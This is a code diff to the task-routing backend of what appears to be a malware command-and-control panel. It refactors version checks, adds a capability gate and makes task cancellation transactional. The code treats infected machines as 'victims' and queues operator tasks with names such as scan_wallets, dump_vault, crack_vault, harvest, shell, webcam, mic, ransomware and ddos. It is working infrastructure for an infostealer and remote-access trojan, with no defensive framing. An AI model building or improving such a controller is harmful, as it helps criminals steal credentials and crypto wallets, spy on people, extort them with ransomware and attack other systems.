@@ -9,19 +9,8 @@ import { publish } from '../lib/bus';
 import { taskLinkError } from '../lib/tasks';
 import { validateParams } from '../lib/task-schemas';
 import { dispatchCommand, hasControl } from './ws';
-
-function compareVersion(value: string | null | undefined, min: string): number {
-  // 0.3.8 was a local build older than 0.3.7; it lacks the 0.3.7 task set.
-  const raw = value === '0.3.8' ? '0.3.6.99' : value;
-  const parse = (input: string) => input.split('.').map((part) => Number.parseInt(part, 10) || 0);
-  const left = parse(raw ?? '0');
-  const right = parse(min);
-  for (let index = 0; index < Math.max(left.length, right.length); index += 1) {
-    const diff = (left[index] ?? 0) - (right[index] ?? 0);
-    if (diff !== 0) return diff;
-  }
-  return 0;
-}
+import { compareVersion } from '../lib/agent-compat';
+import { capabilityMissing } from '../lib/agent-contract';
 
 const TASK_NAMES = ['scan_wallets', 'dump_vault', 'crack_vault', 'clip_start', 'clip_stop', 'shell', 'harvest', 'screenshot', 'file_pull', 'cancel', 'agent', 'monitor', 'files', 'webcam', 'mic', 'ransomware', 'ddos'] as const;
 
@@ -81,7 +70,7 @@ export const taskRoutes: FastifyPluginAsync = async (app) => {
     const input = enqueueSchema.parse(request.body);
     const victims = await prisma.victim.findMany({
       where: { id: { in: input.victim_ids }, revokedAt: null },
-      select: { id: true, hostname: true, agentVersion: true, discord: { select: { channelId: true, missingAt: true } } }
+      select: { id: true, hostname: true, agentVersion: true, capabilities: true, discord: { select: { channelId: true, missingAt: true } } }
     });
     if (victims.length === 0) throw bad('no_victims', 'no live victim in selection');
     // Older agents reject parameters and tasks introduced in 0.3.7. Degrade
@@ -95,6 +84,14 @@ export const taskRoutes: FastifyPluginAsync = async (app) => {
     }
     const invalid = validateParams(input.name, input.params);
     if (invalid) throw bad('invalid_params', invalid, 422);
+    // v2 capability gate: an implemented endpoint can still be absent on this
+    // agent. The panel hides it, but scripts get a typed 501 instead of silence.
+    const missing = victims.filter((victim) => capabilityMissing(victim.capabilities, input.name, input.params));
+    if (missing.length > 0) {
+      throw new HttpError(501, 'capability_not_implemented',
+        `capability not implemented by ${missing.map((victim) => victim.hostname).join(', ')}`, 0,
+        { victim_ids: missing.map((victim) => victim.id) });
+    }
     const notBefore = input.not_before ? new Date(input.not_before) : new Date();
     const due = notBefore.getTime() <= Date.now();
     const online = new Set(victims.filter((victim) => hasControl(victim.id)).map((victim) => victim.id));
@@ -174,9 +171,11 @@ export const taskRoutes: FastifyPluginAsync = async (app) => {
     const task = await prisma.task.findUnique({ where: { id } });
     if (!task) throw notFound('task');
     if (!['queued', 'running'].includes(task.status)) throw bad('finished', 'task already finished');
-    await prisma.task.update({ where: { id }, data: { status: 'cancelled', finishedAt: new Date(), leaseUntil: null } });
-    await prisma.task.create({ data: { victimId: task.victimId, name: 'cancel', params: { task_id: task.id } as never, priority: 10, timeoutSec: 30, createdById: request.operator!.id } });
-    await audit(prisma, { operatorId: request.operator?.id, action: 'task.cancel', entity: 'task', entityId: id, ip: request.clientIp });
+    await prisma.$transaction(async (tx) => {
+      await tx.task.update({ where: { id }, data: { status: 'cancelled', finishedAt: new Date(), leaseUntil: null } });
+      await tx.task.create({ data: { victimId: task.victimId, name: 'cancel', params: { task_id: task.id } as never, priority: 10, timeoutSec: 30, createdById: request.operator!.id } });
+      await audit(tx, { operatorId: request.operator?.id, action: 'task.cancel', entity: 'task', entityId: id, ip: request.clientIp });
+    });
     void publish({ type: 'task.update', victimId: task.victimId, at: Date.now(), data: { id, status: 'cancelled' } });
     return { ok: true };
   });
